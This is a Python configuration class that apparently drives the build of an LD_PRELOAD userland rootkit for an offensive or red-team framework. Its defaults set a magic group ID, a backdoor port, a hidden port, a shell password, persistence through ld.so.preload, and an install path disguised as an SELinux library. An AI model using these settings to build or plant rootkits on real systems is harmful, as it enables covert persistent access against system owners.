from typing import Literal, Optional
from .base import BaseCommand


class FatherCommand(BaseCommand):
    type: Literal['father']
    cmd: Literal['generate'] = 'generate'
    gid: str = '1337'
    srcport: str = '54321'
    epochtime: str = '0000000000'
    env_var: str = 'lobster'
    file_prefix: str = 'lobster'
    preload_file: str = 'ld.so.preload'
    hiddenport: str = 'D431'
    shell_pass: str = 'lobster'
    install_path: str = '/lib/selinux.so.3'
    local_path: Optional[str] = None
    arch: Literal['amd64'] = 'amd64'
    build_command: str = 'make'
